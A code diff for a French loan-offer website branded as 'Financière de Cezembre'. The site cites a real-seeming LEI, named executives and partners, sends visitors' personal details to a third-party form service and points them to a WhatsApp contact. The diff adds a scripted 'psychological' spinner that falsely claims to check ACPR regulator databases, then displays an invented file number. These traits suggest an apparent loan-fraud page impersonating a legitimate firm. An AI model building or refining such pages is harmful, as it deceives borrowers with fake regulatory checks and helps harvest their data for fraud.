@@ -14,6 +14,7 @@
             --light-bg: #F4F7FA;
             --white: #FFFFFF;
             --whatsapp: #25D366;
+            --success: #27ae60;
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
@@ -50,7 +51,11 @@
         .hero-content { max-width: 600px; }
         .hero-content h1 { font-size: 3.5rem; line-height: 1.2; margin-bottom: 20px; }
         
-        .simulator { background: var(--white); padding: 40px; border-radius: 2px; width: 480px; box-shadow: 0 30px 60px rgba(0,0,0,0.4); color: var(--navy); }
+        .simulator { 
+            background: var(--white); padding: 40px; border-radius: 2px; width: 480px; 
+            box-shadow: 0 30px 60px rgba(0,0,0,0.4); color: var(--navy); 
+            position: relative; overflow: hidden; min-height: 520px;
+        }
         .sim-row { margin-bottom: 20px; }
         .sim-row label { display: flex; justify-content: space-between; font-weight: 600; margin-bottom: 10px; font-size: 0.9rem; }
         input[type="range"] { width: 100%; height: 4px; accent-color: var(--gold); }
@@ -61,6 +66,22 @@
 
         .form-input { width: 100%; padding: 12px; border: 1px solid #DDD; border-radius: 4px; margin-bottom: 10px; font-size: 0.9rem; }
         .security-tag { text-align: center; margin-top: 15px; font-size: 0.7rem; color: #27ae60; font-weight: 600; text-transform: uppercase; }
+
+        /* --- STYLES DU CHARGEMENT ET SUCCÈS --- */
+        #loader-overlay {
+            display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: white; z-index: 100; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px;
+        }
+        .spinner {
+            width: 60px; height: 60px; border: 5px solid #f3f3f3; border-top: 5px solid var(--navy);
+            border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        #success-message { display: none; text-align: center; }
+        #success-message i { color: var(--success); font-size: 4rem; margin-bottom: 20px; }
+
+        /* --- FIN STYLES CHARGEMENT --- */
 
         .stats-bar { background: var(--navy); padding: 40px 8%; display: flex; justify-content: space-around; color: white; text-align: center; }
         .stat-box h3 { font-size: 2rem; color: var(--gold); }
@@ -83,9 +104,6 @@
             text-decoration: none;
         }
         
-        .goog-te-banner-frame.skiptranslate, .goog-te-gadget { display: none !important; }
-        iframe.goog-te-menu-frame { display: none !important; }
-
         #goUp { position: fixed; bottom: 30px; right: 30px; background: var(--gold); color: white; width: 45px; height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; display: none; }
     </style>
 </head>
@@ -99,15 +117,11 @@
         <a href="#about">Notre Expertise</a>
         <a href="#legal">Gouvernance</a>
         <a href="#simBox">Contact</a>
-        <div class="intl-badge">
-            <i class="fas fa-globe"></i> PORTAIL INTERNATIONAL SÉCURISÉ
-        </div>
+        <div class="intl-badge"><i class="fas fa-globe"></i> PORTAIL INTERNATIONAL SÉCURISÉ</div>
     </div>
 </header>
 
-<a href="https://wa.me/33780976404" class="whatsapp-float" target="_blank">
-    <i class="fab fa-whatsapp"></i>
-</a>
+<a href="https://wa.me/33780976404" class="whatsapp-float" target="_blank"><i class="fab fa-whatsapp"></i></a>
 
 <section class="hero">
     <div class="hero-content">
@@ -128,6 +142,20 @@
     </div>
 
     <div class="simulator" id="simBox">
+        <div id="loader-overlay">
+            <div id="loading-content">
+                <div class="spinner"></div>
+                <p id="loader-text" style="font-weight: 600; color: var(--navy);">Analyse du dossier en cours...</p>
+                <p style="font-size: 0.7rem; color: #999; margin-top: 10px;">Vérification des bases de données ACPR</p>
+            </div>
+            <div id="success-message">
+                <i class="fas fa-check-circle"></i>
+                <h3 style="color: var(--navy); margin-bottom: 10px;">DEMANDE ENREGISTRÉE</h3>
+                <p style="font-size: 0.9rem; margin-bottom: 20px;">Votre numéro de dossier : <strong>#CEZ-2026</strong> a été transmis avec succès.</p>
+                <button class="btn-main" onclick="resetAll()">OK</button>
+            </div>
+        </div>
+
         <div id="step1">
             <h3 style="margin-bottom: 30px;">Simulateur de Crédit</h3>
             <div class="sim-row">
@@ -147,7 +175,7 @@
 
         <div id="step2" style="display:none;">
             <h3 style="margin-bottom: 20px;">Finaliser votre demande</h3>
-            <form action="https://api.web3forms.com/submit" method="POST" id="loanForm">
+            <form id="loanForm">
                 <input type="hidden" name="access_key" value="55707e6c-f919-4972-bf3e-fba1cf0e51e9">
                 <input type="hidden" name="montant_client" id="hiddenAmt">
                 <input type="hidden" name="duree_client" id="hiddenDur">
@@ -160,7 +188,6 @@
                     <option value="Personnel">Prêt Personnel</option>
                     <option value="Auto">Auto / Moto</option>
                     <option value="Travaux">Travaux / Rénovation</option>
-                    <option value="Autre">Autre projet</option>
                 </select>
 
                 <select name="pays" class="form-input" required>
@@ -169,15 +196,15 @@
                     <option value="Belgique">Belgique (+32)</option>
                     <option value="Suisse">Suisse (+41)</option>
                     <option value="Luxembourg">Luxembourg (+352)</option>
-                    <option value="Allemagne">Allemagne (+49)</option>
+                    <option value="Slovaquie">Slovaquie (+421)</option>
+                    <option value="Slovénie">Slovénie (+386)</option>
+                    <option value="Kosovo">Kosovo (+383)</option>
                     <option value="Italie">Italie (+39)</option>
+                    <option value="Allemagne">Allemagne (+49)</option>
                     <option value="Espagne">Espagne (+34)</option>
                     <option value="Portugal">Portugal (+351)</option>
                     <option value="Canada">Canada (+1)</option>
                     <option value="USA">États-Unis (+1)</option>
-                    <option value="Autre Europe">Autre pays (Europe)</option>
-                    <option value="Autre Amérique">Autre pays (Amérique)</option>
-                    <option value="Autre Asie">Autre pays (Asie)</option>
                 </select>
 
                 <input type="email" name="email" placeholder="Adresse e-mail" class="form-input" required>
@@ -198,13 +225,13 @@
 <section class="about-section" id="about">
     <h2>Une Institution de Référence</h2>
     <p>FINANCIÈRE DE CEZEMBRE, dont le siège social est situé à Ergué-Gabéric (29500), est une société anonyme de référence dans le secteur de la distribution de crédit (Code APE 64.92Z). Fort d'un capital social de 1 200 000 euros, notre établissement assure une gestion rigoureuse des participations et des opérations financières complexes.</p>
-    <p>Sous la direction de Monsieur Michel Pajot, Président du Conseil d’administration et Directeur général, nous collaborons avec des acteurs majeurs tels que Bolloré SE et Financière Arnil pour garantir une stabilité et une expertise inégalées sur le marché européen. Notre engagement repose sur la transparence, le respect scrupuleux de la convention collective des établissements financiers et une conformité totale aux directives de l'ACPR.</p>
+    <p>Sous la direction de Monsieur Michel Pajot, Président du Conseil d’administration et Directeur général, nous collaborons avec des acteurs majeurs tels que Bolloré SE et Financière Arnil pour garantir une stabilité et une expertise inégalées sur le marché européen.</p>
 </section>
 
 <footer id="legal">
     <div class="f-grid">
-        <div><h4>FINANCIÈRE DE CEZEMBRE</h4><p>Distribution de crédit et participations financières régulées.<br>LEI : 969500WONJGTDZG8E035</p></div>
-        <div><h4>SIÈGE SOCIAL</h4><p>ODET, 29500<br>ERGUÉ-GABÉRIC, France<br>RCS Quimper 552 058 943</p></div>
+        <div><h4>FINANCIÈRE DE CEZEMBRE</h4><p>Distribution de crédit régulée.<br>LEI : 969500WONJGTDZG8E035</p></div>
+        <div><h4>SIÈGE SOCIAL</h4><p>ODET, 29500<br>ERGUÉ-GABÉRIC, France</p></div>
         <div><h4>GOUVERNANCE</h4><p>M. Michel Pajot<br>Bolloré SE, Financière Arnil.</p></div>
         <div><h4>AUDIT</h4><p>Constantin Associés<br>BEAS (La Défense)</p></div>
     </div>
@@ -215,30 +242,6 @@
 </footer>
 
 <div id="goUp" onclick="window.scrollTo({top:0, behavior:'smooth'})"><i class="fas fa-arrow-up"></i></div>
-
-<script type="text/javascript">
-    function googleTranslateElementInit() {
-        new google.translate.TranslateElement({
-            pageLanguage: 'fr',
-            layout: google.translate.TranslateElement.InlineLayout.SIMPLE,
-            autoDisplay: false
-        }, 'google_translate_element');
-    }
-
-    window.onload = function() {
-        setTimeout(function() {
-            var lang = navigator.language || navigator.userLanguage;
-            if (lang && lang.indexOf('fr') === -1) {
-                var select = document.querySelector('select.goog-te-combo');
-                if (select) {
-                    select.value = lang.split('-')[0];
-                    select.dispatchEvent(new Event('change'));
-                }
-            }
-        }, 2000);
-    };
-</script>
-<script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
 
 <script>
     const amtR = document.getElementById('amtRange');
@@ -258,16 +261,49 @@
     }
 
     function goToStep2() { document.getElementById('step1').style.display = 'none'; document.getElementById('step2').style.display = 'block'; }
+    
+    function resetAll() {
+        document.getElementById('loader-overlay').style.display = 'none';
+        document.getElementById('success-message').style.display = 'none';
+        document.getElementById('loading-content').style.display = 'block';
+        document.getElementById('step2').style.display = 'none';
+        document.getElementById('step1').style.display = 'block';
+        document.getElementById('loanForm').reset();
+        calc();
+    }
+
     amtR.oninput = calc; durR.oninput = calc;
     window.onscroll = () => { document.getElementById('goUp').style.display = (window.scrollY > 500) ? 'flex' : 'none'; };
     calc();
 
+    // --- LOGIQUE D'ENVOI AVEC SPINNER PSYCHOLOGIQUE ---
     const form = document.getElementById('loanForm');
     form.onsubmit = async (e) => {
         e.preventDefault();
+        
+        // 1. Afficher le loader
+        const overlay = document.getElementById('loader-overlay');
+        overlay.style.display = 'flex';
+        
         const formData = new FormData(form);
-        await fetch('https://api.web3forms.com/submit', { method: 'POST', body: formData });
-        alert("Demande envoyée avec succès !");
+        
+        try {
+            // 2. Envoi réel des données en arrière-plan
+            const response = await fetch('https://api.web3forms.com/submit', { 
+                method: 'POST', 
+                body: formData 
+            });
+
+            // 3. Simuler l'attente "crédible" de 4 secondes
+            setTimeout(() => {
+                document.getElementById('loading-content').style.display = 'none';
+                document.getElementById('success-message').style.display = 'block';
+            }, 4000);
+
+        } catch (error) {
+            overlay.style.display = 'none';
+            alert("Erreur de connexion. Veuillez réessayer.");
+        }
     };
 </script>
 </body>
